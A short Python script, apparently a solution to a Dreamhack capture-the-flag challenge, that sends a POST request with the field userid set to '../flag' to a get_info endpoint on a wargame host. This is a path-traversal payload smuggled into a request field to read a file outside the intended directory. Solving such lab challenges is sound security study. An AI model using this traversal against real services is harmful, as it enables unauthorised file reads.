import requests
url=f"http://host3.dreamhack.games:8276/get_info"
#
data={
    "userid":"../flag"
    }

response=requests.post(url,data)
print(response.text)
